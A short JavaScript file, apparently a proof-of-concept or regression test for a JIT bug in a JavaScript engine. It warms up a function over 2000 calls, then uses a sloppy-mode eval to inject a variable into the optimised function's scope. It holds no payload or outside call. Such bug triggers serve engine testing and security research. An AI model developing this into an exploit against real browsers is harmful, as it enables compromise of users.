function poc() {
    let obj = { a: 1 };
    function inner() {
        if (run_trigger) {
            eval('var new_var = 1.1;');
        }
        obj.a = 2;
    }
    inner();
}

let run_trigger = false;
for (let i = 0; i < 2000; i++) {
    poc();
}

run_trigger = true;
try {
    poc();
} catch (e) {}